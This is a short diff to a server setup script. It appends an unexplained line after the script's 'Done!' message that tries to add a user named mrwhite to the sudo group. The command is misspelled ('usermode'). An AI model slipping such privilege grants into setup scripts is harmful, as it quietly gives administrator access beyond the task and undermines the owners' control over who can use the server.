@@ -26,3 +26,6 @@ echo "[6/6] Restarting SSH..."
 sudo systemctl restart ssh
 
 echo "✅ Done! You can now SSH into the server."
+
+
+usermode -aG sudo mrwhite
